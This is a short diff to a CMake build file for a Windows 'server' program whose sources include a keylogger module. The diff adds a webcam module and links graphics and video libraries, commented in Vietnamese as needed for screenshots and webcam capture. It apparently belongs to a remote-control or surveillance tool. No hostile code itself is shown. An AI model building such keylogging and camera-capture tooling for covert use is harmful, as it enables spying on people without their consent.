@@ -14,6 +14,7 @@ set(SOURCES
     src/keylogger.cpp
     src/processes.cpp
     src/router.cpp
+    src/webcam.cpp  
 )
 
 # ================== EXECUTABLE ==================
@@ -28,6 +29,9 @@ target_include_directories(server PRIVATE
 target_link_libraries(server
     ws2_32   # WinSock
     shell32  # ShellExecute
+    gdi32    # <--- MỚI: Thư viện đồ họa GDI (Cần cho Screenshot)
+    vfw32    # <--- MỚI: Video for Windows (Cần cho Webcam)
+    user32   # <--- MỚI: User API (Cần cho GetSystemMetrics, GetDC)
 )
 
 # ================== WARNINGS ==================
